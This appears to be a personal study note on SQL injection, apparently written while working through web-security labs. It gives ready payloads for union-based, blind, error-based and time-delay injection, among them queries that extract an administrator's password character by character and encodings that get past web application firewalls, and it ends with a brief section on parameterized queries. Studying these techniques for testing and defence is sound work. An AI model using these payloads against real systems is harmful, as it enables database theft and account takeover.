
### General Notes

> Unauthorized user take control over SQL statements used by a web application.
> To explot SQL Injections, first find the injection point, and then craft a payload to take control over a query.
> Try TRUE and FALSE injections to check which one works.

> SQL queries inside web applications must connect to the database, submit the query, and then retrieve the results.

> Can use [[SQLMap]] to automate this test.
> [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

### Finding SQL Injections

>Can be used using [[Burp Suite]]'s web vulnerability scanner.
>The most common other locations where SQL injection arises are:
- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.

> Test all user inputs.
> Test these areas: 
* GET parameters.
* POST parameters.  //Use [[Burp Suite]] proxy
* [[HTTP]] headers.

---

#### Union Based Injections

> The queries must return the same amount of columns as the original one.
> The queries must return data of the same or allowed data type as the original one.
> Getting a 200 response code indicates the right number of columns.

##### Number of Columns using Added `NULL,`
>  When the number of nulls matches the number of columns, an additional row of data will be returned in the result set, containing either the word NULL or an empty string.
```
UNION SELECT NULL
```
> For oracle, need to add FROM for every SELECT. Use the built in DUAL table.

##### Number of Columns using `ORDER BY`
> Keep changing the `ORDER BY` index until an error is recieved.


##### Checking the Data Type of a column
> Having known the number of columns, we can replace the `NULL` with a string/number/data-type and check the output.
> If it succeeds, then we know the data type of that column.
> We can then get exact data we want if we replace that data in the correct column field. It will be produced in an extra row.

---

### Blind SQL Injections

> Application doesn't return the results of the query or details of errors in its response.

> To detect a blind vulnerability:
1. Change logic of query to trigger a detectable difference. Such as boolean logic or generate erros such as dividing by zero. Try true and false use cases. 
2. Trigger a time delay using boolean injection to detect when the delay occurs in which boolean value.
3. Trigger an out-of-band network interaction Out-of-band application security testing (OAST). For instance placing the data retrieved in a [[Domain Name System (DNS)]] lookup for a domain that you control.


##### Tracking [[Cookies]]. 
> Some applications use tracking cookies to gather data about usage and users.
> They are processed by a SQL query such as: 
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
> The behaviour of the website can then be used to determine how the injection is vulnerable.
> Triggering different responses through false and true conditions.

> Use the value of the cookie along with true or false expressions using the `AND` operator to see how the website behaves differently.
> Use this information of true/false behaviours to exploit the website.

##### Conditional Errors LAB 13 IN WALKTHROUGHS

> Sometimes boolean conditions do not affect the responses.
> So we can trigger SQL errors conditionally, causing database errors. This might affect the response.
> Trigger an error when the condition is true, otherwise, don't trigger an error. Check for [[HTTP]] response code 500.
```
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)='' --
xyz' || (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)||' --
```
> Use concatenation for easier expressions. Do not need to check equality in the end.

> Knowing that the `FROM` part of a query is evaluated first then the `SELECT` part, lets use that to try and find the administrator user. `TO_CHAR` in oracle.
```
xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') || ' --
```
> If the administrator username exists, then the SELECT query will be evaluated as the FROM part succeeded. The CASE statement is always true, so it will trigger an error. This error can be used in blind injections to alter the response.
> If the FROM part fails, then the SELECT CASE part won't even run. The page will return normally.

>To add any more conditions, add `AND` in the FROM clause.
```
xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') AND length(password)>5 || ' --
```

##### Blind Enumeration 

* Check for the presence of a table:
```
HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users LIMIT 1)='x' --'
HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users WHERE ROWNUM=1)='x' --'   //oracle
```
> This returns an 'x' for every row in the table. we limit to 1 to check for only 1 x returned. If there is no x returned, then there is no table, or there are no rows in that table.

* Check for the presence of an entry:
```
HNgNNAq7tdrY9x17' AND (SELECT username FROM users WHERE username='administrator')='administrator' --'
```

* Check for the length of a row entry:
```
HNgNNAq7tdrY9x17' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) > 1 )='administrator' --'
```

* Check for the characters of a row entry: (`substr` for oracle)
```
HNgNNAq7tdrY9x17' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a' --'
```

#### Verbose SQL Error Messages

> The error message shows the query we are injecting in, as well as the error message.
> We can make the error message include the sensitive data we need.

> Done using the `CAST()` function, which converts data into different data types.
```
CAST((SELECT x FROM y) AS int)
```
> We usually want string type data. This will return an error message saying invalid data type with the requested data x from table y.

##### Time Delays

> Delaying the SQL queries causes a delay in the [[HTTP]] response.
> Use this delayed time to infer the truth of our query.

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
> If the condition is true, that is the first letter of the admin password is larger than m, then the response will come after a given delay.

* Microsoft: `WAITFOR DELAY '0:0:<delay>'
* PostgreSQL: `SELECT pg_sleep(delay)`
* MySQL: `SELECT SLEEP(10)`
* Oracle: `dbms_pipe.receive_message('a',10)

---

### Payloads

> Try injecting: 
* String terminators: `'` and `"`.
* Other SQL commands: `SELECT`, `UNION`.
* SQL comments: `--` or `#`. For MySQL and Microsoft, add a space then `-` .

##### Example Payloads
> `' OR 'a'='a ` .
> `' UNION SELECT Username, Password FROM Accounts/users WHERE 'a'='a `.
> `' UNION SELECT user(); -- - `. // comment then space then `-` to remove remainder of the query.
> `2' AND 1=1; -- - `.

---

### Different Inputs and Obfuscating Attacks

> Obfuscating is using [[Web Encoding]] to perform attacks that could be blocked using web application [[Firewall]]s.
> Some websites take JSON or [[XML]] in their queries to ask the database.

> For XML use `hex-entities` encoding in [[Burp Suite]]'s hackvertor extension to bypass.

> Can encode some letters of the query to bypass these defense mechanisms.
```
SELECT * FROM information_schema.tables
&#x53;ELECT * FROM information_schema.tables
```
> This is encoding using an HTML entity of a hex.
> This will be decoded first server side, and then passed to the SQL interpreter that communicates with the database.

---

### Enumerating Database

> Get the database information and version.
```
SELECT BANNER FROM v$version;    //oracle
SELECT version FROM v$instance   //oracle
SELECT @@version  //microsoft and MySQL
SELECT version() // PostgreSQL
```

> Getting the tables and their columns. Works on most databases.
```
SELECT * FROM information_schema.tables;
```


##### Using Information_schema

> Can use the `information_schema` database present in most systems (NOT IN ORACLE) to list the tables
```
SELECT * FROM information_schema.tables 
```
> The elements in this database are:
* TABLE_NAME
* TABLE_CATALOG
* TABLE_SCHEMA
* TABLE_TYPE

> Can use one of the tables output in the previous command to display the columns and data types of that table
```
SELECT * FROM information_schema.columns WHERE table_name= <>
```
> The elements in this database are same as above and:
* COLUMN_NAME
* DATA_TYPE

##### Using Information_schema Equivalent For Oracle

> List all tables using `all_tables`
```
SELECT * FROM all_tables
```
* TABLE_NAME

> List columns using `all_tab_columns`
```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```
* COLUMN_NAME

---

### Extra Info

> Commands to identify first character of username.
```
select user(); // returns the current user
select substring(string,position,length); //substring from the position and takes length many chrs.
example: select substring(user(),1,1)='r'; // checks if first letter from user is r.
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

> To concatenate results into one column
* Oracle and PostgreSQL
```
SELECT username || ':' || password FROM users
```
* Microsoft
```
SELECT username + password FROM users
```
* MySQL (space)
```
SELECT username password FROM users
```

---

### Preventing SQL Injections

* Using parameterized queries instead of string concatention within the query.
	* The string used in the query must be a constant and not contain variables.

---
